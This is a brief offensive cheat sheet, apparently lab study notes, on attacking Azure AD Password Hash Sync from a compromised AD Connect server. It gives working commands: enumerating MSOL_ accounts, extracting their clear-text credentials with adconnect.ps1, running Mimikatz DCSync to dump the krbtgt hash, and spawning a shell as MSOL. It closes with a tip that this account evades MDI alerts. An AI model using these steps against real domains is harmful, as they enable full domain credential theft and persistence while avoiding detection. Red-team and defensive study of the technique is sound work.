# AD - Cross Domain Attacks / Azure AD

## Methods

* Password Hash Sync (PHS)
* Pass-Through Authentication (PHA) - on-prem DC has to check all requests - AzureAD just forwards
* Federation

## PHS Attacks

* It shares users and their password hashes from onpremises AD to Azure AD.
* A new users MSOL\_ is created which has Synchronization rights (DCSync) on the domain!
* If you compromise MSOL\_\* account you can conduct the DCSync attack!

Requirement: Compromised AD Connect Server

1. Enumerate PHS Accounts

Get-DomainUser -Identity "MSOL\_\*" -Domain techcorp.local

Get-ADUser -Filter "samAccountName -like 'MSOL\_\*'" - Server techcorp.local -Properties \* | select SamAccountName,Description | fl

2. On AD Connect Machine

With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL\_ account used by AD Connect in clear-text from an mssql db on that server

&#x20;.\adconnect.ps1

3. DC Sync Attack

Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'\
Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'

Start a cmd as MSOL

runas /user:techcopr.local\MSOL\_\*\*\* /netonly cmd

Hint: Please note that because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the MSOL\_ account will be excluded from tools like MDI! This will allow us to run DCSync without any alerts!



